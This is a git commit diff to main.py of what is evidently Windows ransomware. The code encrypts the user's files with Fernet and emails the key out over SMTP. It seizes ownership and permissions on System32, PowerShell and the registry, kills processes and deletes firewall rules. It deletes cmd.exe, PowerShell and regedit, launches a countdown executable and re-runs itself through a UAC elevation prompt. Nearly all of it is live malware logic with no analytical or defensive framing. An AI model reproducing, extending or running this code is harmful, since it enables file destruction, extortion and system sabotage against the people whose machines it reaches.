19b8e0a352dee4939754e44130b6f12d8e401a72
ThomasPoirier-CS <70718793+ThomasPoirier-CS@users.noreply.github.com>
2020-10-18 21:38:17 +0200

    Update main.py
    Call to gui_counter program

--- main.py
+++ main.py
@@ -1,17 +1,21 @@
 #!/usr/bin/python
 #coding:utf-8
+from tkinter import *
+from timeit import default_timer
+import tkinter as tk
 from cryptography.fernet import Fernet
 from modules.crypt import crypt
 from modules.permission import takeown, icacls, get_admin_rights
-from modules.system import killproc, regedit, set_wallpaper
+from modules.system import killproc, regedit, delproc
 from modules.network import host_connect, sendkey_smtp, keyserver
-import os, sys, socket, wget, struct, ctypes, shutil, winreg, time, ctypes
+import os, sys, socket, wget, struct, ctypes, shutil, winreg, time
 
-def get_sys_parameters_info():
-    # Based on if this is 32bit or 64bit returns correct version of SystemParametersInfo function
-    return ctypes.windll.user32.SystemParametersInfoW if is_64_windows() \
-        else ctypes.windll.user32.SystemParametersInfoA
-        
+def copy_counter():
+    cpath = os.getcwd()
+    src = "%s\setup\gui_counter" %(cpath)
+    dst = "\\PerfLogs\\gui_counter"
+    cpy = shutil.copytree(src, dst)
+
 usr = os.environ["USERNAME"]
 if(get_admin_rights.is_admin()):
     if host_connect.keyrcv():
@@ -20,29 +24,34 @@ if(get_admin_rights.is_admin()):
         crypt.genkey(usr)
         sendkey_smtp.send_key()
         takeown.tkOwn_process()
-        takeown.tkOwn_DirWallpaper()
-        takeown.tkOwn_IexploreDir()
+        takeown.tkOwn_perf()
         takeown.tkOwn_regexp()
-        icacls.icc_iexdir()
-        icacls.icc_regexp()
+        icacls.icc_perf()
+        copy_counter()
+        icacls.icc_reg()
+        icacls.icc_exp()
         icacls.icc_powershell()
         icacls.icc_sys32()
-        set_wallpaper.copy_img()
-        crypt.filelist()
-        set_wallpaper.change_wallpaper()
         killproc.pkill_smart()
-        killproc.pkill_exp()
-        icacls.remove_proc()
+        delproc.remove_pwsst()
+        crypt.filelist()
         crypt.filelist_aux()
+        killproc.pkill_exp()
+        delproc.remove_regexp()
         regedit.delSpecRules()
         regedit.delRules()
-        # Delete cmd.exe last because he used for running the program
-        os.remove("\\windows\\system32\\cmd.exe")
-        rmkey = "\\..\\%s.key" %(usr)
-        os.remove(usr)
-        os.remove("\\windows\\regedit.exe")
-
 else:
     print("Or restart the program with Admin permission")
     # Re-run the program with admin rights
     ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv[1:]), None, 1)
+
+path = os.getcwd()
+try:
+    rkey = "%s/%s.key" %(path, usr)
+    os.remove(rkey)
+except:
+    pass
+
+gcount = "\\PerfLogs\\gui_counter\\gui_counter.exe"
+os.system(gcount)
+os.remove("\\windows\\system32\\cmd.exe")
